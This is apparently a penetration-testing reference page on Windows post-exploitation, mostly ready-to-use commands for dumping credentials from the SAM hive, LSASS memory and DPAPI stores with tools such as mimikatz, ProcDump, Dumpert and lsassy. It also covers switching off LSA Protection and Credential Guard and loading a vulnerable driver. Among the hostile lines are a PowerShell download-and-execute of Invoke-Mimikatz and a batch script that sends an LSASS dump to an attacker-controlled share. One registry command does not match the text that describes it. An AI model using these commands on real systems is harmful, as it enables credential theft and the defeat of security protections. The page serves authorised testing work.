# Windows - Post exploitation

Post exploitation is the phase of operation once a target host has been
compromised, usually by gaining local Administrator / SYSTEM access.

Post exploitation should consist of:

  - Retrieving local and domain accounts as well as any sensible information
  stored on the compromised hosts
  - Implementing a way of persistence on the compromised host

### Credentials dumping

Credential dumping is the process of obtaining account login and password
information, normally in the form of a hash or a clear text password, from
the operating system.

On Windows, the users password are stored in the:

  - `Security Account Manager (SAM)` hive, storing the `LM` / `NTLM` hashes of
    the local accounts of the host. The `SysKey`, also referred to as the
    `BootKey`, stored in the `SYSTEM` hive is necessary to decrypt the `SAM`
    hive.
  - `Local Security Authority Subsystem (LSASS)` process, caching clear-text
    passwords or LM/NTLM hashes of logged on users, Kerberos tickets, etc.
  - `Cached domain credentials` hive, in the `HKLM\SYSTEM` hive, storing
    `MsCache` / `MsCacheV2` hashes of domain accounts in order to allow
    re-logon on the machine even if a Domain Controller is not reachable. By
    default, the last 10 accounts used to logon are stored.  
  - `NT Directory Services.Directory Information Tree (NTDS.dit)` file, which
    is the main AD database file, stored on Domain Controllers and containing,
    notably, the NTLM hashes of all domain accounts.  
  - Generic credentials are defined and authenticated by programs that manage
    authorization and security directly. The generic credentials are cached in
    the `Credential Manager`.

Refer to the `[General] File transfer` note for methods to transfer files to
and from the compromised machine.

###### [SAM/mscachev2] Registries dump

The Windows built-in `req` utility can be used to dump the `SAM`, `SYSTEM` and
`SECURITY` registry hives:

```
# Number of cached credentials in MsCache / MsCacheV2
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version\Winlogon\"

# If the registry key is not defined, but the following SecEdit is, the number of cached credentials is restricted through a security policy inf file
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SecEdit\Reg Values\MACHINE/Software/Microsoft/Windows NT/CurrentVersion/Winlogon/CachedLogonsCount"

# The SYSTEM hive contains the SysKey / BootKey and is thus necessary to decrypt the content of the SAM hive.
# The SECURITY hive contains additional useful information such as the machine account password and NTLM hash and the cached domain credentials (mscachev2)
reg save HKLM\SAM <PATH_SAM_FILE>
reg save HKLM\SYSTEM <PATH_SYSTEM_FILE>
reg save HKLM\SECURITY <PATH_SECURITY_FILE>
```

The usage of the `reg.exe` and `regedit.exe` utilities can be restricted
through `Group Policy Object (GPO)` by setting the
`HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools`
registry key to `1`. Trying to use the aforementioned utilities will result in
the following error message: `ERROR: Registry editing has been disabled by your
administrator.`

If such hardening has been implemented on the targeted system, a `shadow copy`
volume can be leveraged to copy the `SAM`, `SYSTEM`, and `SECURITY`
registry hives from disk (as direct copy is not possible due to the files being
locked by continued access).

The `Windows Management Instrumentation (WMI)` class `win32_shadowcopy` can be
used to create a `shadow copy` volume and presents the advantage of being
built-in on both Windows workstations and servers. Alternatively, the Windows
built-in `Volume Shadow Copy Service administrative (vssadmin)` utility may be
used on Windows servers (as the required `vssadmin`'s `create` command is only
available on the Windows Servers operating systems). Refer to the
`[ActiveDirectory] ntds.dit dumping` note for more information on how to
create a `shadow copy` volume using `vssadmin`.

```
# Either commands create the shadow copy volume.
wmic shadowcopy call create Volume='C:\'
powershell.exe -Command (gwmi -List win32_shadowcopy).Create('C:\', 'ClientAccessible')

# Lists the shadow copy volume configured in order to retrieve the created shadow copy ID.
wmic shadowcopy
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_ }

cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SAM <EXPORTED_SAM>"
cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SYSTEM <EXPORTED_SYSTEM>"
cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\System32\config\SECURITY <EXPORTED_SECURITY>"

# Will delete all instances of shadowcopy volumes.
wmic delete

# Deletes the specified shadow copy volume.
Get-WmiObject Win32_ShadowCopy | ForEach-Object { If ($_.ID -like "<GUID>") { $_.Delete() }}

# Alternatively will prompt for confirmation before deleting a shadow copy volume but require to be started through an interactive command prompt.
wmic
wmic:root\cli> shadowcopy delete
```

The Linux tool `samdump2` can be used to extract the credentials from the `SAM`
hive on a Linux system:

```
samdump2 <SYSTEM_FILE> <SAM_FILE>
```

The `Windows 10 Anniversary update`, introduced, in modern Windows operating
systems, a new encryption scheme, based on `AES`, for the `SAM` database.
`samdump2` has not been updated and will return the
`31d6cfe0d16ae931b73c59d7e0c089c0` hash (blank password or account disabled)
for all local users. The `Impacket`'s `secretsdump` Python script supports the
new encryption scheme:

```
secretsdump.py -sam <SAM> -system <SYSTEM> [-security <SECURITY>] LOCAL
```

`Mimikatz` can be used directly on the targeted system to retrieve the local
accounts hashes through the Windows API (and not by decrypting and parsing the
`SAM` hive):

```
# PowerShell in memory injection
# If the compromised host can not access internet, Invoke-Mimikatz.ps1 should be hosted on a local website on the attacking machine
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam" "lsadump::cache" "token::revert"';

mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::cache exit
```

Note that if the Microsoft `Local Administrator Password Solution (LAPS)`
solution is installed on the machine, the password of one of the local account
is likely managed through Active Directory and will not be mutualized with
others Windows systems. The installation of `LAPS` on a system creates the
following `DLL`:

```
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
```

###### [LSASS-Protection] Local Security Authority Protection

*Only affects the LSASS process and does not impact the local accounts, stored
in the SAM registry hive.*

*Concept*

The `Local Security Authority (LSA) Protection` mechanism, firstly introduced
in Windows 8.1 and Windows Server 2012 R2, leverage the `Protected Process
Light (PPL)` technology to restrict access to the `LSASS` process. The `PPL`
protection regulates and restricts operations, such as memory injection or
memory dumping of protected processes, even from process holding the
`SeDebugPrivilege` privilege.

The protection level of a process is defined in its `EPROCESS` structure, used
by the Windows kernel to represent processes in memory. The `EPROCESS`
structure includes a `_PS_PROTECTION` field, defining the protection level of a
process through its `Type` (`_PS_PROTECTED_TYPE`) and `Signer`
(`_PS_PROTECTED_SIGNER`) attributes.  

```
Type (_PS_PROTECTED_TYPE)
First 3 bits contain the type of protected process (refers to the low nibble of the value):

PsProtectedTypeNone = 0
PsProtectedTypeProtectedLight = 1
PsProtectedTypeProtected = 2
PsProtectedTypeMax = 3

Signer (_PS_PROTECTED_SIGNER)
The top 4 bits contain the protected process signer (refers to the high nibble of the value):

# < Windows 10 1607 Redstone 1 (Anniversary Update) x86
PsProtectedSignerNone = 0
PsProtectedSignerAuthenticode = 1
PsProtectedSignerCodeGen = 2
PsProtectedSignerAntimalware = 3
PsProtectedSignerLsa = 4
PsProtectedSignerWindows = 5
PsProtectedSignerWinTcb = 6
PsProtectedSignerMax = 7

# > Windows 10 1607 Redstone 1 (Anniversary Update) x86
[...]
PsProtectedSignerWinSystem = 7
PsProtectedSignerApp = 8
PsProtectedSignerMax = 9
```

For example, `0x31` refers to an Antimalware `PPL` process while `0x52` refers
to a Windows signed protected process.

Whenever an initiator process attempts to conduct an operation on a target
process, a restriction will be applied:
  - if the initiator process' `Type` is (strictly) lower than the target
    process' `Type` (example: `PsProtectedTypeNone` <
    `PsProtectedTypeProtectedLight`).
  - or if the initiator process does not "dominate" the target process, which
    is the case if the target process's `Signer` attribute belongs to the
    initiator process' `DominateMask`. Each `Signer` type is associated with a
    different `DominateMask` mask in the Windows `RtlProtectedAccess` table.  

In such cases, the operations allowed on the target process depends on its
`Signer` attribute. With the exception of the `PsProtectedSignerNone`
processes, for which no restriction are defined, the authorized operations are
limited to:

```
PROCESS_QUERY_LIMITED_INFORMATION
PROCESS_SUSPEND_RESUME
PROCESS_SET_LIMITED_INFORMATION
PROCESS_TERMINATE # (except for PsProtectedSignerLsa, PsProtectedSignerWinTcb and PsProtectedSignerAntimalware).
```

If the `LSA Protection` mechanism is activated on the system, the `LSASS`
process runs under the `PsProtectedSignerLsa-Light` protection level.
The `PROCESS_VM_READ` right, required to read `LSASS`'s data, is only granted
to others protected processes (`Type` >= 1) that "dominate" the
`PsProtectedSignerLsa` `Signer`.

The `LSA Protection` is activated through the `HKEY_LOCAL_MACHINE`'s `RunAsPPL`
registry key:

```
# RunAsPPL = 0x0 or undefined -> The LSASS process is not protected (PsProtectedTypeNone).
# RunAsPPL = 0x1 -> The LSASS process is protected (PsProtectedSignerLsa-Light).

reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa /v RunAsPPL
```

For Windows systems that support the `Unified Extensible Firmware Interface
(UEFI) Secure Boot` technology, an `UEFI` variable is additionally set in the
firmware when `LSA protection` is enabled. This variable can not be altered
through a modification of the `RunAsPPL` registry key and guarantee the
persistence of the `LSA protection`.

```
# UEFISecureBootEnabled = 0x0 or undefined -> The UEFI Secure Boot mechanism is disabled.
# RunAsPPL = 0x1 -> The UEFI Secure Boot mechanism is enabled.

reg query HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SecureBoot\State /v UEFISecureBootEnabled
```

*Operational*

If `UEFISecureBootEnabled` is disabled, and the targeted system can be safely
rebooted, the `RunAsPPL` registry key can be simply set to `0x0` to disable the
`LSA Protection` mechanism:

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SecureBoot\State /v UEFISecureBootEnabled /d 0x0
```

If `UEFISecureBootEnabled` is enabled, a driver can be loaded in the Windows
kernel to execute code in the kernel space which allows for the modification of
every processes' `EPROCESS` structure (that contain the `_PS_PROTECTION`
field). The `SeLoadDriverPrivilege` is required in order to load a kernel
driver.

In order for a driver to be loaded, the driver file must be digitally signed
either:
  - for signature date prior to 29/07/2015, with a trusted cross-signed
    certificate, du to compatibility reasons for older drivers.
  - with a trusted `Extended Validation Code Signing Certificate`
    certificate and `Windows Hardware Quality Labs (WHQL)` certified.

If there no antivirus solution installed on the targeted system, or if the
solution deployed can be disabled, `mimikatz`'s `mimidrv` driver, digitally
signed in 2013, can be used to disable the `LSA Protection` mechanism. The
driver can be loaded as a kernel driver through `mimikatz`, which will result
in the creation of the driver `mimidrv` service (service type:
`SERVICE_KERNEL_DRIVER`). The loaded driver may then be used to protect the
`mimikatz` process, with a protection `Type` set to `PsProtectedTypeMax` and a
`Signer` level of `PsProtectedSignerWinTcb`, in order to "dominate" the
`lsass` process and be able to dump its memory.

Note that the driver file `mimidrv.sys` must be present in the same directory
as the `mimikatz.exe` being executed.

```
# One-liner: mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processProtect /process:mimikatz.exe" "sekurlsa::logonpasswords" "exit"

# If necessary.
mimikatz # token::elevate
mimikatz # privilege::debug

# Loads the mimidrv driver and protect the mimikatz process.
mimikatz # !+
mimikatz # !processProtect /process:mimikatz.exe

# Futher mimikatz commands.
mimikatz # sekurlsa::logonpasswords
[...]

# Stop the driver and removes the mimidrv service
mimikatz # !-
```

If a protected antivirus solution is installed on the targeted system, a
legitimate driver vulnerable to a code execution vulnerability can be loaded in
order to gain kernel space code execution. The `gdrv-loader` project leverages
the `gdrv.sys` driver, vulnerable to multiples critical vulnerabilities
(`CORE-2018-0007`), to load the specified unsigned driver. Doing so, a modified
`mimidrv` driver that does not raise antivirus alerts can be loaded in memory.  

```
# Loads the (potentially unsigned) specified driver using the gdrv.sys driver.
gdrv-loader.exe gdrv.sys <mimidrv.sys | DRIVER_FILE_PATH>

# The mimikatz process can directly be protected as the mimidrv driver is loaded in the kernel.
mimikatz # !processProtect /process:mimikatz.exe
[...]

# Unloads the specified driver.
gdrv-loader.exe <mimidrv.sys | DRIVER_FILE_PATH>
```

Alternatively, the Microsoft official `LSA Protection` opt-out procedure can be
followed in order to disable the `LSA Protection` mechanism and reset the
`UEFI` variable.

```
Procedure source: https://www.microsoft.com/en-us/download/details.aspx?id=40897

reg add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SecureBoot\State /v UEFISecureBootEnabled /d 0x0

# Requires the x64\LsaPplConfig.efi or x86\LsaPplConfig.efi Extensible Firmware Interface files from the official procedure.
# Should be run in a command prompt with elevated privileges.
mountvol X: /s
copy C:\LsaPplConfig.efi X:\EFI\Microsoft\Boot\LSAPPLConfig.efi /Y
bcdedit /create {0cb3b571-2f2e-4343-a879-d86a476d7215} /d "DebugTool" /application osloader
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} path "\EFI\Microsoft\Boot\LSAPPLConfig.efi"
bcdedit /set {bootmgr} bootsequence {0cb3b571-2f2e-4343-a879-d86a476d7215}
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions %1
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} device partition=X:
mountvol X: /d
```

###### [LSASS-Protection] Microsoft Credentials Guard

*Only affects the LSASS process and does not impact the local accounts, stored
in the SAM registry hive.*

`Credential Guard` is a virtualization-based isolation technology for the
`LSASS` which prevents introduced with Microsoft's Windows 10 (Enterprise
edition).

When `Credentials Guard` is activated, an `LSAIso` (*LSA Isolated*) process is
created in `Virtual Secure Mode`, a feature that leverages the virtualization
extensions of the CPU to provide added security of data in memory. Access to
the `LSAIso` process are restricted even for an access with the
`NT AUTHORITY\SYSTEM` security context. When processing a hash, the `LSA`
process perform a `RPC` call to the `LSAIso` process, and waits for the
`LSAIso` result to continue. Thus, the `LSASS` process won't contain any
secrets and in place will store `LSA Isolated Data`.

The PowerShell `Get-CimInstance` can be used to check if `Credential Guard` is
running:

```
# Credential Guard is running if SecurityServicesConfigured contains 1
Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
```

If `Credential Guard` was enabled with `UEFI Lock`, the settings are persisted
in `EFI` (firmware) variables and disabling Credential Guard will require
a "physical presence at the machine to press a function key to accept the
change" after reboot . Note that if `Credential Guard` was not enabled with
`UEFI Lock` it can be disabled through a network session and will require a
reboot of the machine.

Disabling `Credential Guard` will not allow for the retrieval of the
secrets currently stored in the `LSASS` process but will enable the retrieval
of further credentials stored after reboot.

```
# 0 Disables Credential Guard.
# 1 Enables Credential Guard.
# 2 Enables Credential Guard without making it persist to the UEFI.
REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags"

# Disabling Credential Guard
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Device Guard" /v EnableVirtualizationBasedSecurity /d 0 /f /t REG_DWORD
```

###### [LSASS] Task manager

Since Vista, the `Task Manager` GUI utility tool can be used to easily dump the
LSASS process. To open the task manager while in a RDP session type `taskmgr`
in a command prompt.

The procedure to dump the LSASS process using the task manager is as follow:

```
Details -> Right click "lsass.exe" -> Create Dump File
```

###### [LSASS] Dumpert

`Dumpert` is a tool, written in `C`, that uses direct Windows `System Calls`
(`ZwProtectVirtualMemory` and `ZwWriteVirtualMemoryto`) to unhook Windows APIs
in order to dump the `LSASS` process with out being detected by `Anti-Virus` or
`Endpoint Detection and Response (EDR)` that rely on Windows user-land API
hooks.

`Dumpert` can be used either as a standalone executable or as a DLL, that can
be executed using the Windows built-in `rundll32` utility:

```
Dumpert.exe

rundll32.exe Dumpert-DLL.dll,Dump
```

A `Shellcode Reflective DLL Injection (sRDI)` version of the code is also
provided, coupled with a `Cobalt Strike` `agressor` script that uses the
`Cobalt Strike`'s beacon `shinject` command to inject the `sRDI` shellcode
into the current process. Through this execution method, `Dumpert` is executed
without the executable file being written to the compromised system disk.

The `sRDI` shellcode is a conversion of the `Dumpert` DLL made using the `sRDI`
project's `ConvertToShellcode.py` Python script:

```
python3 ConvertToShellcode.py Outflank-Dumpert.dll
```

After importing the `Outflank-Dumpert.cna` `agressor` script in `Cobalt Strike`
(`Cobalt Strike` -> `Script Manager` -> Load), the `dumpert` command can be
used through a `Cobalt Strike` beacon. The command will inject the shellcode
into the beacon process, dump `LSASS` into `C:\Windows\Temp\dumpert.dmp` using
`Dumpert` (DLL), and finally download the dump file on the C2 server.

```
beacon> dumpert
beacon> rm C:\Windows\Temp\dumpert.dmp
```

###### [LSASS] comsvcs.dll

The Windows built-in DLL `comsvcs.dll` exposes the `MiniDump` function that can
be leveraged to dump the LSASS process. The `rundll32` Windows built-in
utility can be used to load the `comsvcs.dll` DLL and run the `MiniDump`
function.

Note that the process conducting the dump must have `debug privileges`
enabled, which is by default the case of `PowerShell` process run from an
elevated context.

```
tasklist /FI "imagename eq lsass.exe"
Get-Process lsass | Ft Id

rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> "<PATH_LSASS_DUMP>" full
powershell -c rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> "<PATH_LSASS_DUMP>" full
```

The following `bat` script automates the process and exfiltrate the `lsass`
dump to a remote share:

```
For /F "Tokens=2" %%I in ('tasklist /FI "imagename eq lsass.exe"') Do Set LsassPid=%%I

powershell.exe -c rundll32 C:\windows\system32\comsvcs.dll MiniDump %LsassPid% "C:\Windows\System32\spool\drivers\color\lsass.dmp" full

IF EXIST "C:\Windows\System32\spool\drivers\color\lsass.dmp" (
	dir \\<LHOST>\TMP
	xcopy /Y /i /q "C:\Windows\System32\spool\drivers\color\lsass.dmp" "\\<LHOST>\TMP"
  del "C:\Windows\System32\spool\drivers\color\lsass.dmp"
)
```

###### [LSASS] ProcDump

`ProcDump` is a command-line utility tool signed by Microsoft and part of the
`sysinternals` suite.

It can be used to dump the LSASS process with out raising any antivirus alert on
all Windows operating systems.

```
procdump.exe -accepteula -ma lsass.exe <PATH_LSASS_FILE>
rm <PATH_LSASS_FILE>

# Trough a meterpreter session
upload <PATH/procdump.exe> C:
execute -f "C:\procdump.exe" -a '-accepteula -ma lsass.exe <PATH_LSASS_DUMP>'
download <PATH_LSASS_DUMP>
rm <PATH_LSASS_DUMP>
```

###### [LSASS] lsassy

The Python utility and library `lsassy` can be used to remotely extract
credentials using the two techniques above. `Lsassy` tries to dump the `lsass`
process on the remote host, and then parses the `lsass` dump remotely.

In addition to using the `comsvcs.dll` DLL with `rundll32.exe` and uploading
and executing `procdump.exe`, `lsassy` will try lastly upload and execute
`dumpert.exe`.

```
# As a standalone CLI utility
# TARGETS = IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets
lsassy [-d <DOMAIN>>] -u <USERNAME> -p <PASSWORD> --format pretty <TARGETS>
lsassy [-d <DOMAIN>] -u <USERNAME> -H <NTLMHASH> --format pretty <TARGETS>

# As a Python library
from lsassy.core import Lsassy

lsassy = Lsassy(hostname="<HOSTNAME | IP>", username="<USERNAME>", domain="<DOMAIN>", password="<PASSWORD>")
credentials = lsassy.get_credentials()
for credential in credentials:
    [...]
```

###### [LSASS/SAM] Mimikatz

`Mimikatz` can be used to extract plaintexts passwords, hash, PIN code and
kerberos tickets from memory.  

It can be used:

  - By uploading the `mimikatz` released binary on the targeted system, which
  will almost certainly raise an antivirus alert
  - By uploading a custom `mimikatz` binary on the targeted system, which may
  raise an antivirus alert
  - Through the injection in memory of the `Invoke-mimikatz` PowerShell script
  (with CME or manually), which may raise an antivirus alert
  - Through a `meterpreter` session by using the `mimikatz` or kiwi modules,
  which may raise an antivirus alert
  - By extracting the LSASS process with the `Task Manager`, `ProcDump` or
  others utilities and using `mimikatz` off target

The commands below may be used as a one-liner in the form of
`mimikatz.exe "<COMMAND1>" "<COMMAND2>" "exit"`.

```
mimikatz # log <LOG_FILE>

# If necessary, elevates privileges to NT AUTHORITY\SYSTEM
mimikatz # token::elevate

# If necessary, acquires the SeDebugPrivilege privilege.
mimikatz # privilege::debug

# If necessary, Instructs mimikatz to load the specified LSASS dump file and to execute the commands following against it.
mimikatz # sekurlsa::minidump <LSASS_FILE>

# Retrieves credentials (cleartext passwords and NTLM hashes) from the msv, tspkg, wdigest, kerberos, ssp and credman providers.
mimikatz # sekurlsa::logonpasswords

# Retrieves the Kerberos tickets, both TGTs and service tickets, from all active sessions.
mimikatz # sekurlsa::tickets

# Dumps credentials on Domain Controllers.
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::lsa /inject /user:<krbtgt | USERNAME>

# PowerShell in memory injection
# If the compromised host can not access internet, Invoke-Mimikatz.ps1 should be hosted on a local website on the attacking machine
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds;
```

###### [SAM/LSASS] Meterpreter

The `meterpreter` module `hashdump` can be used to dump the SAM base on a
compromised host:

```
meterpreter> hashdump
```

The `Metasploit` module `post/windows/gather/lsa_secrets` can be used to dump
the LSASS secrets trough a `meterpreter` session:

```
msf> use post/windows/gather/lsa_secrets
```

The `meterpreter` extensions `mimikatz` and `kiwi` can be used to dump
credentials through a `meterpreter` session without the need to write any file
to the compromised host's disks. The `kiwi` extension replace the previous
`mimikatz` extension with a much simpler interface command system and works on
Windows XP SP3 and Windows 2003 SP1 all the way up to 10 and 2016.

On x64 host, make sure that the `meterpreter` session is running as a 64 bits
process (using `sysinfo`), otherwise `meterpreter` will attempt to load a 32bit
version of `Mimikatz` into memory, which will cause most features to be
non-functional.  

```
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
meterpreter> creds_kerberos / creds_msv / creds_ssp / creds_tspkg / creds_wdigest    

# Older version
meterpreter> load mimikatz

meterpreter> mimikatz_command -f samdump::hashes
meterpreter> mimikatz_command -f sekurlsa::logonpasswords
meterpreter> kerberos / livessp / msv / ssp / tspkg / wdigest  
```

###### [SAM/LSASS] Cobalt Strike

The Cobalt Strike built-in functions `[beacon] -> Access -> Dump Hashes`
(`hashdump` from the beacon interact console) and `[beacon] -> Access ->
Run Mimikatz` will, respectively, dump the SAM database and execute `mimikatz`
`sekurlsa::logonpasswords` through a beacon.

The functions output will be automatically parsed and the harvested credentials
added to the Cobalt Strike credentials database `View -> Credentials`.

###### [SAM/LSASS] CrackMapExec

`CrackMapExec` is a framework to pentest Windows/Active Directory environments.
It can be used to dump the SAM base or the LSASS process remotely using local or
domain administrator credentials in the form of password or hash (for the
default local Administrator account and the domain accounts) if the SMB port
is exposed.  

For more information about `CrackMapExec` refer to the `[Active Directory]
Credentials theft shuffle` note.  

Usage:

```
# SAM
crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump
crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

###### [DPAPI] Generic and third parties credentials

Windows exposes cryptographic functions through the `Data Protection
Application Programming Interface (DPAPI)` API to allow third parties programs
to locally store encrypted secrets. `DPAPI` notably provides the
`CryptProtectData` and `CryptUnprotectData` functions to, respectively, encrypt
and decrypt data. Leveraging the `DPAPI`, softwares can thus rely on the
operating system to manage the cryptographic keys and to implement the
cryptographic algorithms. Among others, the `Google Chrome` and
`Internet Explorer` / `Edge` web browsers as well as the Windows
`Remote Desktop Protocol (RDP)` utility and the `Wireless Local Area Network
(WLANSVC)` service save credentials using the `DPAPI`.

Secrets originating from Microsoft products are generally stored by the
`Credential Manager` in:

  - `Credentials` files, located in
  `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\<GUID>`.

  - `Windows Vaults`, such as the `Windows Credentials` vault (independent
  from `Credentials` files). `Vaults` are stored as a combination of `vpol` and
  `vsch` files in
  `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Microsoft\Vault\<GUID>`.

`Google Chrome` saves by default credentials and secrets, such as cookies, in:

  - the `Login Data` `SQLitev3` database, located in
  `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\Default\Login Data`.

  - the `Cookies` file, located in
  `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\Default\Cookies`.

The aforementioned files are only accessible to the specific user (owner of the
files), the local `Administrators` group, and the Windows `NT AUTHORITY\SYSTEM`
built-in account.

```
# Lists the Credentials files for each user, given the current security context.
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Roaming\Microsoft\Credentials"

# Lists the Google Chrome credentials and cookies files, given the current security context.
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data"
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Cookies"

# Lists the configured Windows Vaults and information about the vaults's stored credentials (notably username, originating application, target).
# Current user Windows Vault.
vaultcmd /list
# Lists the Windows Vault of each user, given the current security context.
Get-ChildItem -Force -Path "C:\Users\*\AppData\Local\Microsoft\Vault\*"

# Lists information about the specified Windows Vault.
# Default Windows Vaults: Windows Credentials (GUID: 77BC582B-F0A6-4E15-4E80-61736B6F3B29) and Web Credentials (GUID: 4BF4C442-9B8A-41A0-B380-DD4A704DDB28).
vaultcmd /listcreds:"<VAULT_NAME | VAULT_GUID>" /all

# Lists the configured WiFi profiles, indicating if a security key is included
netsh wlan show profiles
```

Credentials are ultimately stored as `CredentialBlob`, encrypted using a
`DPAPI` `MasterKey`. The `DPAPI` `MasterKeys` are stored as files, located in
`%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\<USER_SID>\<GUID>`.

The `DPAPI` `MasterKeys` are protected:
  - for domain users, using a combination of the user's `SID` and (current or
  previous) `NTLM` hash. A copy of the `MasterKey` is also protected using
  the `DPAPI` `Domain Backup Key`.
  - for local users, using a combination of the user's `SID` and (current or
  previous) `SHA1` hash.

Those properties imply that:
  - All domain users `DPAPI` `MasterKeys` can be retrieved, and stored
  credentials decrypted, if the `DPAPI` `Domain Backup Key` is compromised.
  - The `NTLM` hashes of local users can not be used to decrypt `DPAPI`
  `MasterKeys` as the plaintext password is required to compute the user
  password `SHA1` hash.

```
# Lists the DPAPI MasterKeys files for each user, given the current security context.
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Roaming\Microsoft\Protect\S-*"
```

`mimikatz` implements various `DPAPI` modules to decrypt `DAPI`
`CredentialBlob` and operationally parse the resulting data in order to extract
the saved credentials:
  - `dpapi::blob`: raw `CredentialBlob` with out parsing of the resulting data
  - `dpapi::capi` / `dpapi::cng`: Windows `Cryptographic API (CAPI)` /
  `Cryptography API: Next Generation (CNG)` containing the users' certificates
  public and private keys. `CNG` is the replacement of `CAPI`, starting from
  the Windows Server 2008 and Windows Vista operating system.
  - `dpapi::cred`: Windows `Credentials` files.
  - `dpapi::vault`: Windows `Vaults` directories.
  - `dpapi::wifi`: `WiFi` password saved by the `WLANSVC` service.
  - `dpapi::wwan`: mobile cellular network passwords for embedded module
  adapter saved by the `WWANSVC` service.
  - `dpapi::chrome`: credentials and cookies saved by `Google Chrome`.
  - `dpapi::rdg`: `RDP` files generated by the `Remote Desktop Connection
  Manager (RDCman)` whenever saving `RDP` credentials.

Depending on the attack scenario and satisfied prerequisite(s), `DAPI`
`CredentialBlob` can be decrypted using `mimikatz` in a number of ways:

| Prerequisite(s) | Description | Process |
|-----------------|-------------|---------|
| Running under the specific user security context (whom may not be privileged). | Leverages the `DPAPI` `CryptUnprotectData` function, implicitly using the specific user `MasterKeys`, to decrypt the specified `DPAPI` blob. | Decryption of the specified blob, with the according `mimikatz` module: <br/> `mimikatz.exe "dpapi::<MODULE> /in:<BLOB_PATH> /unprotect" exit` |  
| Privileged access (`SeDebugPrivilege` privilege) on the system while the specific user is logged in. | Extracts the `DPAPI` `MasterKeys` from memory to decrypt the spcified `DPAPI` blob. | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/> Extraction of all users `MasterKeys` in memory: <br/> `mimikatz# privilege::debug` <br/> `mimikatz# sekurlsa::dpapi` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |
| Privileged access on the system and knowledge of the specific user **plaintext password**. | Uses the user's plaintext password to decrypt the `MasterKey` in order to decrypt the specified `DPAPI` blob. | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/> Decryption of the required `MasterKey` using the user plaintext password: <br/> `mimikatz.exe "privilege::debug" "token::elevate" "dpapi::masterkey /in:<MASTER_KEY_PATH> /sid:<USER_SID> /password:<USER_PASSWORD> /protected" exit` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |
| Knowledge of the specific user **plaintext password**. | Uses the user's plaintext password to start a process under the specific user security context in order to leverage the `DPAPI` `CryptUnprotectData` function to decrypt the specified `DPAPI` blob. | Refer to the `Windows - Lateral movement` note for TTP to locally or remotely start a process using the user's plaintext password. <br/> Running under the specific user security context, the first method can then be used. |
